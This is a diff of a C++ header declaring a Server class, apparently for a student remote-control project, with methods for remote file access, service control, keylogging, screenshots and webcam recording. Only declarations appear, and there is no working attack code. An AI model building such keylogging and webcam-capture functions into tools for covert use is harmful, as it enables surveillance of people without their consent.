@@ -1,17 +1,10 @@
 #ifndef SERVER_H_
 #define SERVER_H_
 
-#include <filesystem>
-
-#include <windows.h>
-#include <stdio.h>
-
-#include "opencv2/opencv.hpp"
-#include "opencv2/highgui/highgui.hpp"
-
 #include "common/Request.h"
 
-// using namespace cv;
+using namespace cv;
+using namespace std;
 
 class Server {
     public:
@@ -28,15 +21,15 @@ class Server {
         bool handleGetFile(Request& request, Response& response);
         bool handleDeleteFile(Request& request, Response& response);
         bool listRunningService(Request& request, Response& response);
-        bool handleStartService(Request& request, Response& response);
-        bool handleStopService(Request& request, Response& response);
+        bool startService(Request& request, Response& response);
+        bool stopService(Request& request, Response& response);
+        bool handleService(Request& request, Response& response);
 
         
         // Thinh
         bool keylog(Request& request, Response &response);
 
         //Duc
-        bool isRecording;
         bool screenshot(Request& request, Response &response);
         bool getVideoByWebcam(Request& request, Response &response);
         
